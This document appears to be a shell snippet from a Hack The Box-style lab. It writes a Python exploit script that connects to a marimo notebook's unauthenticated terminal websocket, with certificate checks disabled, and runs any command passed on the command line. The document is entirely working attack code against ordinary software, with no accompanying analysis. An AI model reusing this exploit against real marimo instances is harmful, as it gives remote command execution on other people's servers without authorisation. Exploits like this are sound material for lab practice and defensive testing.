```json
cat > marimo_exploit.py << 'EOF'
#!/usr/bin/env python3
import websocket
import ssl
import time
import sys

# Disable SSL warnings
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

target = "nb-1be3782a8afd3ad5.cohort.htb"
cmd = ' '.join(sys.argv[1:]) if len(sys.argv) > 1 else "id"

try:
    # Connect with SSL disabled
    ws = websocket.WebSocket()
    ws.connect(
        f'wss://{target}/terminal/ws',
        sslopt={"cert_reqs": ssl.CERT_NONE, "check_hostname": False}
    )
    time.sleep(2)
    
    # Clear initial output
    try:
        while True:
            ws.settimeout(0.5)
            ws.recv()
    except:
        pass
    
    # Send command
    ws.send(cmd + '\n')
    time.sleep(2)
    
    # Get result
    output = ""
    while True:
        try:
            ws.settimeout(1)
            output += ws.recv()
        except:
            break
    
    print(output.strip() if output else "Command executed (no output)")
    ws.close()
    
except Exception as e:
    print(f"Exploit failed: {e}")
EOF

chmod +x marimo_exploit.py
```
